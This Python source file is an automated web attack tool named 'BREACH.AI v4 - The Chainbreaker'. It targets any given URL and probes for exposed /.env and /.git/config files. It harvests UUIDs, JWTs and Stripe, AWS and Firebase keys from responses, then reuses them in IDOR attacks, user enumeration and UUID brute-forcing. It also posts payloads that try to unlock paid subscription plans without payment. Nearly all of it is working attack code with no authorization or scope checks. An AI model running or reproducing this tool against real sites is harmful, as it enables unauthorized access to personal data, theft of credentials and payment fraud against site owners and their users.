#!/usr/bin/env python3
"""
BREACH.AI v4 - The Chainbreaker

This version learns from responses and CHAINS findings together.

What it does differently:
1. Extracts ALL identifiers (userIds, UUIDs, IDs) from every response
2. Uses those IDs to attack OTHER endpoints
3. Detects auth patterns automatically
4. Brute-forces intelligently based on discovered patterns
5. Proves breaches with actual data extraction

The key insight: Every response teaches us something.
- A 404 that should be 401? Auth bypass.
- A userId in a URL? Try other userIds.
- A UUID in response? Use it everywhere.
- A count endpoint? Enumerate users.

Usage:
    python breach_v4.py https://target.com
    python breach_v4.py https://target.com --cookie "session=xxx"
    python breach_v4.py https://target.com --deep  # Aggressive mode
"""

import asyncio
import aiohttp
import json
import sys
import os
import re
import time
import random
import string
from dataclasses import dataclass, field
from typing import Optional, List, Dict, Any, Set, Tuple
from urllib.parse import urlparse, urljoin, parse_qs, urlencode, urlunparse
from datetime import datetime
from collections import defaultdict

from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich import box

console = Console()


# ============================================================================
# PATTERNS - What we look for
# ============================================================================

# UUID pattern (v4)
UUID_PATTERN = re.compile(r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}', re.I)

# Numeric ID pattern
NUMERIC_ID_PATTERN = re.compile(r'(?:id|Id|ID)["\s:=]+(\d+)')

# Generic ID in URL path
PATH_ID_PATTERN = re.compile(r'/([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}|[0-9]+)(?:/|$|\?)')

# UserId in query string
USERID_QUERY_PATTERN = re.compile(r'[?&]userId=([^&]+)')

# JWT pattern
JWT_PATTERN = re.compile(r'eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+')

# API key patterns
API_KEY_PATTERNS = {
    'stripe_pk': re.compile(r'pk_(?:live|test)_[a-zA-Z0-9]+'),
    'stripe_sk': re.compile(r'sk_(?:live|test)_[a-zA-Z0-9]+'),
    'stripe_price': re.compile(r'price_[a-zA-Z0-9]+'),
    'supabase_key': re.compile(r'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+'),
    'firebase_key': re.compile(r'AIza[a-zA-Z0-9_-]{35}'),
    'aws_key': re.compile(r'AKIA[A-Z0-9]{16}'),
}

# PII field names
PII_FIELDS = {'email', 'phone', 'password', 'address', 'ssn', 'name', 'credit_card', 'token', 'secret', 'api_key', 'creditcard'}


# ============================================================================
# DATA STRUCTURES
# ============================================================================

@dataclass
class ExtractedID:
    """An identifier we extracted."""
    value: str
    type: str  # uuid, numeric, jwt, api_key
    source: str  # URL or endpoint where found
    context: str  # query param, path, body, header


@dataclass
class AuthPattern:
    """Detected authentication pattern."""
    type: str  # cookie, bearer, api_key, query_param
    name: str  # cookie name, header name, param name
    value: str
    works: bool = True


@dataclass
class EndpointBehavior:
    """How an endpoint behaves with different inputs."""
    endpoint: str
    method: str

    # Response patterns
    auth_required: bool = False
    accepts_user_id: bool = False
    returns_user_data: bool = False

    # Status codes we've seen
    status_codes: Set[int] = field(default_factory=set)

    # What IDs work
    valid_ids: List[str] = field(default_factory=list)

    # Interesting behaviors
    auth_bypass_possible: bool = False  # 404 instead of 401
    idor_possible: bool = False  # Different data with different IDs


@dataclass
class Breach:
    """A confirmed breach."""
    severity: str
    title: str
    description: str
    endpoint: str
    attack_chain: List[str]
    data_extracted: Any
    reproduction: str


@dataclass
class ChainState:
    """State of the attack chain."""
    target: str

    # Extracted identifiers
    uuids: Set[str] = field(default_factory=set)
    numeric_ids: Set[str] = field(default_factory=set)
    user_ids: Set[str] = field(default_factory=set)
    jwts: Set[str] = field(default_factory=set)
    api_keys: Dict[str, str] = field(default_factory=dict)

    # Auth patterns
    auth_patterns: List[AuthPattern] = field(default_factory=list)

    # Endpoint behaviors
    endpoints: Dict[str, EndpointBehavior] = field(default_factory=dict)

    # Breaches found
    breaches: List[Breach] = field(default_factory=list)

    # Attack log
    attack_log: List[str] = field(default_factory=list)

    def log(self, msg: str):
        """Log an attack step."""
        self.attack_log.append(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")
        console.print(f"[dim]{msg}[/dim]")

    def add_uuid(self, uuid: str, source: str):
        """Add a discovered UUID."""
        if uuid not in self.uuids:
            self.uuids.add(uuid)
            console.print(f"[cyan]  +UUID[/cyan] {uuid[:8]}... from {source}")

    def add_user_id(self, user_id: str, source: str):
        """Add a discovered user ID."""
        if user_id not in self.user_ids:
            self.user_ids.add(user_id)
            console.print(f"[cyan]  +UserID[/cyan] {user_id[:20]}... from {source}")

    def add_api_key(self, key_type: str, key: str, source: str):
        """Add a discovered API key."""
        if key_type not in self.api_keys:
            self.api_keys[key_type] = key
            console.print(f"[red]  +{key_type}[/red] {key[:20]}... from {source}")

    def get_all_ids(self) -> List[str]:
        """Get all IDs for testing."""
        return list(self.uuids | self.numeric_ids | self.user_ids)


# ============================================================================
# EXTRACTORS - Pull information from responses
# ============================================================================

class ResponseAnalyzer:
    """Analyze responses to extract useful information."""

    @staticmethod
    def extract_ids(body: str, url: str, state: ChainState):
        """Extract all identifiers from a response."""

        # UUIDs
        for uuid in UUID_PATTERN.findall(body):
            state.add_uuid(uuid, url)

        # UUIDs from URL
        for uuid in UUID_PATTERN.findall(url):
            state.add_uuid(uuid, "url")

        # User IDs from query string
        for match in USERID_QUERY_PATTERN.findall(url):
            state.add_user_id(match, url)

        # Numeric IDs
        for match in NUMERIC_ID_PATTERN.findall(body):
            if match not in state.numeric_ids:
                state.numeric_ids.add(match)

        # JWTs
        for jwt in JWT_PATTERN.findall(body):
            if jwt not in state.jwts:
                state.jwts.add(jwt)
                console.print(f"[yellow]  +JWT[/yellow] {jwt[:30]}...")

        # API Keys
        for key_type, pattern in API_KEY_PATTERNS.items():
            for key in pattern.findall(body):
                state.add_api_key(key_type, key, url)

    @staticmethod
    def detect_pii(data: Any) -> List[str]:
        """Detect PII fields in response data."""
        pii_found = []

        def scan(obj, path=""):
            if isinstance(obj, dict):
                for k, v in obj.items():
                    key_lower = k.lower()
                    for pii in PII_FIELDS:
                        if pii in key_lower:
                            pii_found.append(f"{path}.{k}" if path else k)
                    scan(v, f"{path}.{k}" if path else k)
            elif isinstance(obj, list):
                for i, item in enumerate(obj[:5]):  # Check first 5 items
                    scan(item, f"{path}[{i}]")

        scan(data)
        return pii_found

    @staticmethod
    def is_auth_error(status: int, body: str) -> bool:
        """Check if response indicates auth error."""
        if status in [401, 403]:
            return True

        body_lower = body.lower()[:500]
        auth_errors = ['unauthorized', 'forbidden', 'not authenticated', 'login required', 'access denied']
        return any(err in body_lower for err in auth_errors)

    @staticmethod
    def is_not_found(status: int, body: str) -> bool:
        """Check if response is 404."""
        return status == 404 or 'not found' in body.lower()[:200]


# ============================================================================
# ATTACK CHAINS - Sequences of attacks
# ============================================================================

class AttackChains:
    """Pre-defined attack chains that combine findings."""

    @staticmethod
    async def chain_userid_enumeration(session: aiohttp.ClientSession, state: ChainState, base_url: str):
        """
        Chain: Use count endpoint to enumerate valid userIds.

        If /api/something/count?userId=X returns count > 0, the userId is valid.
        """
        state.log("Starting userId enumeration chain")

        # Find count endpoints
        count_endpoints = [
            '/api/projects/count',
            '/api/users/count',
            '/api/items/count',
            '/api/orders/count',
            '/api/resources/count',
            '/api/investors/count',
        ]

        valid_user_ids = []

        # Try known userIds first
        test_ids = list(state.user_ids)[:5]

        # Generate UUID variations if we have samples
        if state.uuids:
            sample_uuid = list(state.uuids)[0]
            # Try incrementing last character
            for i in range(16):
                variant = sample_uuid[:-1] + hex(i)[2:]
                test_ids.append(variant)

        for endpoint in count_endpoints:
            url = urljoin(base_url, endpoint)

            for user_id in test_ids[:20]:  # Limit to 20 tests
                test_url = f"{url}?userId={user_id}"

                try:
                    async with session.get(test_url, ssl=False, timeout=10) as resp:
                        if resp.status == 200:
                            body = await resp.text()
                            try:
                                data = json.loads(body)
                                count = data.get('count', 0)

                                if count > 0:
                                    valid_user_ids.append(user_id)
                                    state.log(f"Valid userId found: {user_id} (count: {count})")

                                    # This is an info leak - endpoint accepts any userId
                                    if user_id not in state.user_ids:
                                        state.breaches.append(Breach(
                                            severity="MEDIUM",
                                            title="User Enumeration via Count Endpoint",
                                            description=f"Can enumerate valid userIds via {endpoint}",
                                            endpoint=endpoint,
                                            attack_chain=["Discovered userId pattern", f"Tested {endpoint} with userId param", "Found valid userId"],
                                            data_extracted={"valid_user_ids": valid_user_ids},
                                            reproduction=f"curl '{test_url}'"
                                        ))
                            except:
                                pass
                except:
                    pass

        return valid_user_ids

    @staticmethod
    async def chain_auth_bypass_detection(session: aiohttp.ClientSession, state: ChainState, base_url: str):
        """
        Chain: Detect auth bypass by comparing 404 vs 401.

        Pattern:
        - /api/resource → 401 (protected)
        - /api/resource/{id} → 404 (auth bypassed!)
        """
        state.log("Starting auth bypass detection chain")

        # Endpoints to test
        endpoints = [
            '/api/projects',
            '/api/users',
            '/api/payments',
            '/api/orders',
            '/api/documents',
            '/api/teams',
            '/api/organizations',
            '/api/investors',
            '/api/subscriptions',
        ]

        bypasses = []

        for endpoint in endpoints:
            url = urljoin(base_url, endpoint)

            # Test base endpoint
            try:
                async with session.get(url, ssl=False, timeout=10) as resp:
                    base_status = resp.status
            except:
                continue

            # Only interesting if base requires auth
            if base_status != 401:
                continue

            # Now test with ID
            test_ids = list(state.uuids)[:3] + ['1', '2', 'test', 'admin']

            for test_id in test_ids:
                id_url = f"{url}/{test_id}"

                try:
                    async with session.get(id_url, ssl=False, timeout=10) as resp:
                        id_status = resp.status

                        # Auth bypass: Base is 401, but ID endpoint is 404 (not 401)
                        if id_status == 404:
                            bypasses.append({
                                'base': endpoint,
                                'bypassed': f"{endpoint}/{test_id}",
                                'pattern': f"Base: 401, With ID: 404"
                            })

                            state.log(f"🔴 AUTH BYPASS: {endpoint} → {endpoint}/{test_id}")

                            state.breaches.append(Breach(
                                severity="HIGH",
                                title=f"Auth Bypass on {endpoint}/{{id}}",
                                description=f"Base endpoint {endpoint} returns 401, but {endpoint}/{{id}} returns 404 - authentication middleware not applied to parameterized route",
                                endpoint=f"{endpoint}/{{id}}",
                                attack_chain=[
                                    f"Tested {endpoint} → 401",
                                    f"Tested {endpoint}/{test_id} → 404",
                                    "Auth not enforced on ID-based route"
                                ],
                                data_extracted=None,
                                reproduction=f"curl '{urljoin(base_url, endpoint)}' # 401\ncurl '{id_url}' # 404"
                            ))
                            break  # Found bypass for this endpoint

                        # Even better: We got data!
                        elif id_status == 200:
                            body = await resp.text()
                            if len(body) > 50:
                                state.log(f"🔴 DATA ACCESS: {endpoint}/{test_id} → 200")

                                state.breaches.append(Breach(
                                    severity="CRITICAL",
                                    title=f"Unauthenticated Data Access on {endpoint}/{{id}}",
                                    description=f"Can access data at {endpoint}/{{id}} without authentication",
                                    endpoint=f"{endpoint}/{{id}}",
                                    attack_chain=[
                                        f"Tested {endpoint} → 401",
                                        f"Tested {endpoint}/{test_id} → 200 with data",
                                        "Full auth bypass confirmed"
                                    ],
                                    data_extracted=body[:500],
                                    reproduction=f"curl '{id_url}'"
                                ))
                                break
                except:
                    pass

        return bypasses

    @staticmethod
    async def chain_idor_with_extracted_ids(
        session: aiohttp.ClientSession,
        state: ChainState,
        base_url: str,
        auth_cookie: str = None
    ):
        """
        Chain: Use IDs from one endpoint to access data on another.

        Pattern:
        1. /api/public-endpoint returns UUIDs
        2. Use those UUIDs on /api/private-endpoint/{uuid}
        """
        state.log("Starting IDOR chain with extracted IDs")

        if not state.uuids and not state.user_ids:
            state.log("No IDs extracted yet, skipping IDOR chain")
            return []

        # Endpoints to try with extracted IDs
        sensitive_endpoints = [
            '/api/projects/{id}',
            '/api/users/{id}',
            '/api/orders/{id}',
            '/api/payments/{id}',
            '/api/documents/{id}',
            '/api/files/{id}',
            '/api/messages/{id}',
            '/api/profiles/{id}',
            '/api/investors/{id}',
            '/api/subscriptions/{id}',
        ]

        headers = {}
        cookies = {}

        if auth_cookie:
            for part in auth_cookie.split(';'):
                if '=' in part:
                    k, v = part.strip().split('=', 1)
                    cookies[k] = v

        idor_findings = []
        all_ids = list(state.uuids)[:10] + list(state.user_ids)[:5]

        for endpoint_template in sensitive_endpoints:
            for test_id in all_ids:
                endpoint = endpoint_template.replace('{id}', test_id)
                url = urljoin(base_url, endpoint)

                try:
                    async with session.get(
                        url,
                        headers=headers,
                        cookies=cookies if cookies else None,
                        ssl=False,
                        timeout=10
                    ) as resp:
                        if resp.status == 200:
                            body = await resp.text()

                            if len(body) > 100:
                                try:
                                    data = json.loads(body)
                                    pii = ResponseAnalyzer.detect_pii(data)

                                    idor_findings.append({
                                        'endpoint': endpoint,
                                        'id': test_id,
                                        'pii': pii
                                    })

                                    state.log(f"🔴 DATA ACCESS: {endpoint}")
                                    if pii:
                                        state.log(f"   PII exposed: {', '.join(pii)}")

                                    state.breaches.append(Breach(
                                        severity="CRITICAL" if pii else "HIGH",
                                        title=f"IDOR: Data Access via Extracted ID",
                                        description=f"Used ID {test_id[:20]}... extracted from another endpoint to access {endpoint}",
                                        endpoint=endpoint,
                                        attack_chain=[
                                            f"Extracted ID {test_id[:20]}... from public endpoint",
                                            f"Used ID on {endpoint_template}",
                                            f"Got data with {len(body)} bytes" + (f" including PII: {pii}" if pii else "")
                                        ],
                                        data_extracted=data if isinstance(data, dict) else body[:500],
                                        reproduction=f"curl '{url}'" + (f" -H 'Cookie: {auth_cookie[:50]}...'" if auth_cookie else "")
                                    ))
                                except:
                                    pass
                except:
                    pass

        return idor_findings

    @staticmethod
    async def chain_subscription_bypass(
        session: aiohttp.ClientSession,
        state: ChainState,
        base_url: str,
        auth_cookie: str = None
    ):
        """
        Chain: Test subscription/payment bypass vulnerabilities.
        """
        state.log("Starting subscription bypass chain")

        cookies = {}
        if auth_cookie:
            for part in auth_cookie.split(';'):
                if '=' in part:
                    k, v = part.strip().split('=', 1)
                    cookies[k] = v

        # Endpoints to test for subscription bypass
        subscription_endpoints = [
            ('/api/user/subscription', {'subscriptionPlan': 'PRO'}),
            ('/api/user/subscription', {'plan': 'premium'}),
            ('/api/subscription/upgrade', {'tier': 'pro'}),
            ('/api/billing/plan', {'plan': 'enterprise'}),
            ('/api/user/credits', {'credits': 9999}),
            ('/api/user/plan', {'plan': 'unlimited'}),
        ]

        for endpoint, payload in subscription_endpoints:
            url = urljoin(base_url, endpoint)

            try:
                async with session.post(
                    url,
                    json=payload,
                    cookies=cookies if cookies else None,
                    ssl=False,
                    timeout=10
                ) as resp:
                    if resp.status == 200:
                        body = await resp.text()
                        try:
                            data = json.loads(body)

                            # Check if subscription was changed
                            if any(k in str(data).lower() for k in ['pro', 'premium', 'enterprise', 'unlimited', 'credits']):
                                state.log(f"🔴 SUBSCRIPTION BYPASS: {endpoint}")

                                state.breaches.append(Breach(
                                    severity="CRITICAL",
                                    title="Subscription/Payment Bypass",
                                    description=f"Can upgrade subscription without payment via {endpoint}",
                                    endpoint=endpoint,
                                    attack_chain=[
                                        f"POST to {endpoint}",
                                        f"Payload: {json.dumps(payload)}",
                                        f"Response indicates plan change: {str(data)[:200]}"
                                    ],
                                    data_extracted=data,
                                    reproduction=f"curl -X POST '{url}' -H 'Content-Type: application/json' -d '{json.dumps(payload)}'"
                                ))
                        except:
                            pass
            except:
                pass


# ============================================================================
# MAIN ENGINE
# ============================================================================

class ChainbreakerEngine:
    """
    BREACH.AI v4 - The Chainbreaker

    Automatically chains findings to prove breaches.
    """

    def __init__(self, deep_mode: bool = False):
        self.deep_mode = deep_mode
        self.session: Optional[aiohttp.ClientSession] = None
        self.state: Optional[ChainState] = None

    async def __aenter__(self):
        self.session = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=30),
            headers={'User-Agent': 'BREACH.AI/4.0 Chainbreaker'}
        )
        return self

    async def __aexit__(self, *args):
        if self.session:
            await self.session.close()

    async def breach(
        self,
        target: str,
        cookie: str = None,
        token: str = None
    ) -> ChainState:
        """Execute the chainbreaker attack."""

        if not target.startswith('http'):
            target = f'https://{target}'

        self.state = ChainState(target=target)

        # Banner
        console.print(Panel.fit(
            "[bold red]BREACH.AI v4 - CHAINBREAKER[/bold red]\n"
            "[dim]Learn. Chain. Break. Prove.[/dim]\n\n"
            f"Target: {target}\n"
            f"Mode: {'Deep' if self.deep_mode else 'Standard'}",
            border_style="red"
        ))

        start_time = time.time()

        # Phase 1: Initial Recon - Extract everything
        console.print(f"\n[bold cyan]▶ PHASE 1: RECONNAISSANCE[/bold cyan]")
        await self._recon_phase(target)

        # Phase 2: Run Attack Chains
        console.print(f"\n[bold cyan]▶ PHASE 2: ATTACK CHAINS[/bold cyan]")
        await self._chain_phase(target, cookie)

        # Phase 3: Deep exploitation (if enabled)
        if self.deep_mode:
            console.print(f"\n[bold cyan]▶ PHASE 3: DEEP EXPLOITATION[/bold cyan]")
            await self._deep_phase(target, cookie)

        # Report
        elapsed = time.time() - start_time
        self._print_report(elapsed)

        return self.state

    async def _recon_phase(self, target: str):
        """Initial reconnaissance to gather information."""

        # Endpoints to probe
        recon_endpoints = [
            '/',
            '/api/health',
            '/api/status',
            '/api/config',
            '/api/plans',
            '/api/pricing',
            '/api/auth/csrf',
            '/api/auth/providers',
            '/api/auth/session',
            '/api/investors',
            '/api/user/credits',
            '/graphql',
            '/.env',
            '/.git/config',
            '/swagger.json',
            '/openapi.json',
            '/api-docs',
            '/robots.txt',
            '/sitemap.xml',
        ]

        for endpoint in recon_endpoints:
            url = urljoin(target, endpoint)

            try:
                async with self.session.get(url, ssl=False, timeout=10) as resp:
                    status = resp.status
                    body = await resp.text()

                    if status == 200 and len(body) > 20:
                        # Skip if it's a 404 page pretending to be 200
                        if '404' in body[:500] and 'not found' in body.lower()[:500]:
                            continue

                        console.print(f"[green]  ✓ {endpoint}[/green] ({len(body)} bytes)")

                        # Extract IDs from response
                        ResponseAnalyzer.extract_ids(body, url, self.state)

                        # Check for exposed sensitive data
                        if endpoint in ['/.env', '/.git/config']:
                            self.state.breaches.append(Breach(
                                severity="CRITICAL",
                                title=f"Exposed Sensitive File: {endpoint}",
                                description=f"Sensitive configuration file publicly accessible",
                                endpoint=endpoint,
                                attack_chain=[f"Accessed {endpoint}", "File contents exposed"],
                                data_extracted=body[:500],
                                reproduction=f"curl '{url}'"
                            ))

                        # Look for interesting data
                        if '/api/' in endpoint:
                            try:
                                data = json.loads(body)
                                if isinstance(data, list) and len(data) > 0:
                                    console.print(f"[yellow]    → {len(data)} records exposed[/yellow]")
                                elif isinstance(data, dict):
                                    pii = ResponseAnalyzer.detect_pii(data)
                                    if pii:
                                        console.print(f"[red]    → PII fields: {', '.join(pii)}[/red]")

                                    # Check for exposed API keys in config
                                    if endpoint in ['/api/config', '/api/health', '/api/status']:
                                        for key_type, pattern in API_KEY_PATTERNS.items():
                                            for key in pattern.findall(body):
                                                self.state.add_api_key(key_type, key, endpoint)
                            except:
                                pass

                    elif status == 401:
                        self.state.endpoints[endpoint] = EndpointBehavior(
                            endpoint=endpoint,
                            method='GET',
                            auth_required=True,
                            status_codes={401}
                        )
                        console.print(f"[yellow]  🔒 {endpoint}[/yellow] (auth required)")
            except Exception as e:
                pass

        # Summary
        console.print(f"\n[dim]Extracted: {len(self.state.uuids)} UUIDs, {len(self.state.user_ids)} userIds, {len(self.state.api_keys)} API keys[/dim]")

    async def _chain_phase(self, target: str, cookie: str = None):
        """Run attack chains."""

        # Chain 1: Auth Bypass Detection
        console.print(f"\n[yellow]Chain 1: Auth Bypass Detection[/yellow]")
        await AttackChains.chain_auth_bypass_detection(self.session, self.state, target)

        # Chain 2: UserId Enumeration
        if self.state.user_ids or self.state.uuids:
            console.print(f"\n[yellow]Chain 2: UserId Enumeration[/yellow]")
            await AttackChains.chain_userid_enumeration(self.session, self.state, target)

        # Chain 3: IDOR with Extracted IDs
        if self.state.uuids or self.state.user_ids:
            console.print(f"\n[yellow]Chain 3: IDOR with Extracted IDs[/yellow]")
            await AttackChains.chain_idor_with_extracted_ids(self.session, self.state, target, cookie)

        # Chain 4: Subscription Bypass (if cookie provided)
        if cookie:
            console.print(f"\n[yellow]Chain 4: Subscription Bypass[/yellow]")
            await AttackChains.chain_subscription_bypass(self.session, self.state, target, cookie)

    async def _deep_phase(self, target: str, cookie: str = None):
        """Deep exploitation phase."""

        # UUID brute force
        if self.state.uuids:
            console.print(f"\n[yellow]Deep: UUID Variation Testing[/yellow]")

            sample_uuid = list(self.state.uuids)[0]
            base = sample_uuid[:-2]

            tested = 0
            for i in range(256):
                variant = base + format(i, '02x')

                # Quick test on a few endpoints
                for endpoint in ['/api/projects/', '/api/users/', '/api/documents/', '/api/investors/']:
                    url = urljoin(target, f"{endpoint}{variant}")

                    try:
                        async with self.session.get(url, ssl=False, timeout=5) as resp:
                            if resp.status == 200:
                                body = await resp.text()
                                if len(body) > 100 and '404' not in body[:200]:
                                    self.state.log(f"Found valid ID: {variant}")
                                    self.state.add_uuid(variant, f"brute_force_{endpoint}")
                    except:
                        pass

                tested += 1
                if tested % 50 == 0:
                    console.print(f"[dim]  Tested {tested}/256 UUID variants...[/dim]")

    def _print_report(self, elapsed: float):
        """Print final report."""

        console.print(f"\n{'═' * 70}")

        if self.state.breaches:
            critical = len([b for b in self.state.breaches if b.severity == "CRITICAL"])
            high = len([b for b in self.state.breaches if b.severity == "HIGH"])
            medium = len([b for b in self.state.breaches if b.severity == "MEDIUM"])

            if critical > 0:
                console.print(f"[bold red]🔴 {critical} CRITICAL + {high} HIGH + {medium} MEDIUM SEVERITY BREACHES[/bold red]")
            elif high > 0:
                console.print(f"[bold yellow]🟡 {high} HIGH + {medium} MEDIUM SEVERITY ISSUES[/bold yellow]")
            else:
                console.print(f"[bold blue]🔵 {medium} MEDIUM SEVERITY ISSUES[/bold blue]")
        else:
            console.print(f"[bold green]🟢 NO BREACHES CONFIRMED[/bold green]")

        console.print(f"{'═' * 70}\n")

        # Summary table
        table = Table(box=box.ROUNDED, title="Summary")
        table.add_column("Metric", style="cyan")
        table.add_column("Value")

        table.add_row("Target", self.state.target)
        table.add_row("Time", f"{elapsed:.1f}s")
        table.add_row("UUIDs Extracted", str(len(self.state.uuids)))
        table.add_row("UserIds Found", str(len(self.state.user_ids)))
        table.add_row("API Keys Found", str(len(self.state.api_keys)))
        table.add_row("Breaches", f"[red]{len(self.state.breaches)}[/red]" if self.state.breaches else "0")

        console.print(table)

        # API Keys found
        if self.state.api_keys:
            console.print(f"\n[bold red]API Keys Exposed:[/bold red]")
            for key_type, key in self.state.api_keys.items():
                console.print(f"  • {key_type}: {key[:30]}...")

        # Breaches
        if self.state.breaches:
            console.print(f"\n[bold]Breaches Found:[/bold]")

            for i, breach in enumerate(self.state.breaches, 1):
                severity_color = {'CRITICAL': 'red bold', 'HIGH': 'red', 'MEDIUM': 'yellow'}.get(breach.severity, 'white')

                console.print(f"\n  {i}. [{severity_color}][{breach.severity}][/{severity_color}] {breach.title}")
                console.print(f"     {breach.description}")
                console.print(f"     [dim]Endpoint: {breach.endpoint}[/dim]")

                console.print(f"     [dim]Attack Chain:[/dim]")
                for step in breach.attack_chain:
                    console.print(f"       → {step}")

                if breach.data_extracted:
                    data_preview = str(breach.data_extracted)[:200]
                    console.print(f"     [dim]Data: {data_preview}...[/dim]")

                console.print(f"     [dim]Reproduce: {breach.reproduction[:100]}...[/dim]")

        console.print(f"\n{'═' * 70}\n")


# ============================================================================
# CLI
# ============================================================================

async def main():
    import argparse

    parser = argparse.ArgumentParser(description='BREACH.AI v4 - The Chainbreaker')
    parser.add_argument('target', help='Target URL')
    parser.add_argument('--cookie', help='Session cookie')
    parser.add_argument('--token', help='Bearer token')
    parser.add_argument('--deep', action='store_true', help='Enable deep exploitation mode')
    parser.add_argument('--json', action='store_true', help='Output JSON report')

    args = parser.parse_args()

    async with ChainbreakerEngine(deep_mode=args.deep) as engine:
        state = await engine.breach(
            target=args.target,
            cookie=args.cookie,
            token=args.token
        )

    if args.json:
        report = {
            'target': state.target,
            'uuids_found': len(state.uuids),
            'user_ids_found': len(state.user_ids),
            'api_keys_found': list(state.api_keys.keys()),
            'breaches': [
                {
                    'severity': b.severity,
                    'title': b.title,
                    'description': b.description,
                    'endpoint': b.endpoint,
                    'reproduction': b.reproduction
                }
                for b in state.breaches
            ]
        }
        print(json.dumps(report, indent=2))


if __name__ == '__main__':
    asyncio.run(main())
